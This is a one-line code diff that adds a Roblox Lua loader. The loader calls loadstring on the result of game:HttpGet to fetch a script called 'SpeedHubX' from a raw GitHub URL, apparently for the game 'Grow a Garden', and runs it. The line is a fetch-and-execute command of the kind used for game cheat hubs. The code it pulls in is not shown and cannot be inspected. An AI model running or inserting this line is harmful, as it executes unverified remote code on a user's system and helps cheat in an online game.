@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-growagarden/growagarden/refs/heads/main/SpeedHubX"))()
